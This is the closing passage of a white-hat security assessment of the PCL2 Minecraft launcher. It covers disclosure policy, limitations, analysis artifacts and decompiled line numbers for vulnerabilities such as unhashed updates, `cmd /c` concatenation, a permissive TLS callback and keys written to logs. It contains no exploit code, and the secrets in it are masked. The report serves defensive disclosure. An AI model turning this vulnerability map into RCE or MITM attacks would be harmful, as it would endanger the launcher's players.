- 行为符合《中华人民共和国网络安全法》《数据安全法》《个人信息保护法》及《刑法》第 285、286 条所划定的合法边界。

**3. 披露策略**

- 本材料**原则上优先私下提交**给作者及其安全团队（GitHub Security Advisory 或其它可达渠道），并建议任何读者处理该问题时给予 **90 天**修复窗口（实际作者的Github账号已被封禁，通过公开渠道未取得作者任何有效联系方式）；
- 报告中**不包含可直接武器化的完整利用代码**；示例以占位命令与数据流图形式给出；
- 对敏感值作**遮蔽处理**：CurseForge API Key 仅保留前缀、CDN 签名共享密钥以 `PCL2****er` 表示；
- 在修复发布前，**不公开**可复现的攻击脚本，不在公开平台发布逐步利用教程；
- 若作者需要，可提供完整的反编译产物。

**4. 数据处置**

- 分析过程中未收集、未存储任何真实用户数据；
- 未连接线上服务，未产生任何真实用户标识、令牌或日志；
- 本地分析产物（`re_work/`）仅用于本次评估，不对外分发。

**5. 结论边界**

- 本报告结论基于 **v2.13.0.1（VersionCode 406）** 这一具体样本；其它版本（Beta、快照、后续版本）可能不同；
- 未做服务端测试，`ServerConfig` 线上真实结构未取回，因此 PCL2-2026-02 的实际危害取决于 EasyTier 参数语义；
- 未对第三方依赖（Newtonsoft.Json、CacheCow、NAudio 等）做 CVE 级审计；
- 所有"可能"、"可被"表述均为**基于静态证据的推断**，不等于已实现的武器化利用。

**6. 责任**

- 本材料仅供作者、其安全团队及受其委托的第三方用于修复目的；
- 任何第三方将本材料内容用于非法用途，后果由其自行承担，与作者及本报告编写者无关；
- 若本报告的任何表述与事实有出入，欢迎指正，将第一时间更正。

**7. 致谢与态度**

PCL2 是一个由个人长期维护、服务大量玩家的开源项目。指出问题不等于否定价值。本次评估的出发点，是希望这些"设计上的便利"不要在某个不幸的时刻变成"结构性的脆弱"。

---

## 九、说明与局限

1. **未做动态调试**：所有结论来自静态反编译、依赖程序集源码级审查，以及一处针对性运行时实验。未在受控环境运行启动器，以避免其向线上服务器发起真实请求。
2. **未验证服务端**：`ServerConfig.json` 线上真实内容（`Update`、`Link`、`Custom` 等键的实际取值）未取回。PCL2-2026-02 的危害程度取决于 EasyTier 支持的参数集。
3. **依赖审计不完整**：13 个内嵌程序集已全部提取，但仅深入审查 `MeloongCore`（`FileUtils` / `MsDelta` / `FileChecker`）与 `PCLCS`（类型清单）；`Newtonsoft.Json` 9.x/10.x、`CacheCow`、`NAudio` 等未做漏洞级比对。
4. **`FilterAccessToken` 脱敏覆盖不完整**：仅匹配 `accessToken `（带空格）与当前会话令牌；若未来引入 URL 形式令牌将失效。属观察项，未计入漏洞。
5. **低危/信息项未做动态验证**（PCL-DOS-001、PCL-INFO-002 等），因危害明确、静态证据充分。
6. **本报告不构成对软件安全性的最终结论**：安全评估是快照，不是判决。修复落地后应重新核验。

---

## 附录 A：分析产物

| 文件 | 内容 |
|---|---|
| `re_work/decomp/Plain Craft Launcher 2.decompiled.cs` | 全量反编译（88,510 行 / 501 类型） |
| `re_work/modsecret.cs` | `PCL.ModSecret` 单类型导出（1,632 行） |
| `re_work/decomp_meloong/…` | `MeloongCore` 反编译（`FileUtils` / `MsDelta` / `FileChecker`） |
| `re_work/decomp_pclcs/…` | `PCLCS` 反编译 |
| `re_work/embedded/` | 13 个内嵌程序集原始 PE 镜像 |
| `re_work/types.txt` | 类型清单（501 项） |
| `re_work/tls_probe/` | 6.5 节的实验环境：自签证书（`cert.pem` / `key.pem`）+ 本地 HTTPS 服务（`server.py`）+ 回调复刻脚本（`probe.cs`） |
| `re_work/wrap_mermaid.py`、`re_work/mmcheck/blocks/` | 图表断行脚本 + 28 张图的渲染结果（用 mermaid-cli 逐张渲染验证语法与换行，依赖已清理） |
| `re_work/dotnet/` | 便携 .NET SDK 8.0.426（仅用于运行 ilspycmd，约 726MB） |

## 附录 B：关键证据定位（反编译文件行号）

| 事实 | 位置 |
|---|---|
| 动作分发 `switch` | `decomp/…cs:23850-23888` |
| `HasUpdatePermission => true` | `modsecret.cs:386` |
| `InputPotatoCode` 仅提示 | `modsecret.cs`（`InputPotatoCode` 函数体） |
| 更新 URL 取值 / 无哈希 | `decomp/…cs:22642-22679` |
| 更新落地（删 exe / 解压 / MsDelta） | `decomp/…cs:22691-22705` |
| `Latest.zip` 仅 MinSize | `decomp/…cs:23595-23602` |
| `EasyTier.zip` 仅 MinSize 2MB | `decomp/…cs:38211-38216` |
| `Settings.Set` 白名单 | `decomp/…cs:71725-71760` |
| `LaunchAdvanceRun → cmd /c` | `decomp/…cs:58404-58448` |
| `LatestLaunch.bat` 拼接 | `decomp/…cs:58415-58425` |
| `SecretCdnSign` | `decomp/…cs:22916-22926`、`modsecret.cs:412-429` |
| `SecretHeadersSign` / CF Key | `decomp/…cs:22929-22960` |
| TLS 回调 | `decomp/…cs:52849-52864`、`71563-71566` |
| `DNSLookup` → IP 改写 | `decomp/…cs:52731-52737` |
| `OpenWebsite` 协议白名单 | `decomp/…cs:88219-88227` |
| ZIP 穿越校验 | `decomp_meloong/…cs:4044-4048`、`4549-4558` |
| `UpdateReplace` 路径锚定 | `modsecret.cs:996-997` |
| `Identify` 生成 | `modsecret.cs:1576-1624` |
| `Identify` 入日志 | `decomp/…cs:78406` |
| `desInitialVector` / DES 实现 | `decomp/…cs:71717`、`71966-71995` |
| 联机参数拼接 | `decomp/…cs:38270-38293` |
| `ProcessStart` / 密钥入日志 | `decomp/…cs:38567-38585` |
| `SystemSystemCache` 定义 / `PathTemp` | `decomp/…cs:71461`、`87555` |
| `Ssl3` 启用 | `decomp/…cs:78395-78398` |

## 附录 C：术语

| 术语 | 含义 |
|---|---|
| RCE | 远程代码执行 |
| MITM | 中间人攻击 |
| CDN / COS | 内容分发网络 / 对象存储（此处为腾讯云 COS） |
| `{CDN}` | PCL 的 URL 签名占位符，替换后为 `?sign=<ts>-<rand>-0-<md5>` |
| `Identify` | PCL 的本地稳定设备标识，格式 `XXXX-XXXX-XXXX-XXXX` |
| 土豆码 | PCL 的官方构建授权码（ECDSA），与公告/更新内容签名无关 |
| kill switch | 远程熔断开关，用于在不发版的情况下关闭问题功能 |

---

## 附：本仓库文件索引

> 本 README 即 [`安全评估报告_PCL2全量反编译.md`](安全评估报告_PCL2全量反编译.md) 的全文，两者内容一致。

| 文件 | 内容 |
|---|---|
| [`安全评估报告_PCL2全量反编译.md`](安全评估报告_PCL2全量反编译.md) | **主报告**：16 项前序结论逐条判定（成立 / 部分成立 / 不成立 + 原因）+ 8 项新增发现 + 实验环境与过程 + 对作者说明的逐点评价 |
| [`流程分析报告_PCL2全量反编译.md`](流程分析报告_PCL2全量反编译.md) | 24 条漏洞逐条复核：判定与证据等级、大白话解释、代码实锤、28 张利用流程图 |
| [`反汇编核验报告_PCL2_2.13.0.1.md`](反汇编核验报告_PCL2_2.13.0.1.md) | 反汇编产物清单与逐项核验记录 |
| [`安全评估报告_ModSecret.md`](安全评估报告_ModSecret.md) | 前序材料：基于作者公开源码片段（186 行）的静态推断，16 项 |
| [`漏洞原理教程_ModSecret.md`](漏洞原理教程_ModSecret.md) | 面向非安全背景读者的原理教程 |
| [`ModSecret（PCL2作者龙腾猫跃公开部分源码）.txt`](ModSecret（PCL2作者龙腾猫跃公开部分源码）.txt) | 作者公开的源码片段（原始素材） |
| `ModSecret下载链接.txt` | 上述源码的下载来源 |
| [`tools/`](tools) | Mermaid 图表排版 / 校验脚本、TLS 回调实测工具 |
| [`figures/`](figures) | 28 张流程图的渲染快照（`b01`–`b28`，与 `流程分析报告` 中的图一一对应） |

**关于样本与反编译产物**：`Plain Craft Launcher 2.exe`（v2.13.0.1，5,645,824 B，SHA-256 `0ab0b28a93cc4d0754a9fa488b5939b5e092f0e5fb3f1e6550cc92a5d3f6577f`）及其反编译代码**未在本仓库分发**，报告中仅保留文件偏移 / 行号 / 代码摘录，供官方按同版本样本复现核验。

---

**免责声明**：本仓库全部内容为善意白帽安全研究，遵循负责任披露原则，仅用于推动问题修复，不构成对任何个人或组织的指控。报告中涉及的密钥、令牌、口令等敏感值均已遮蔽。
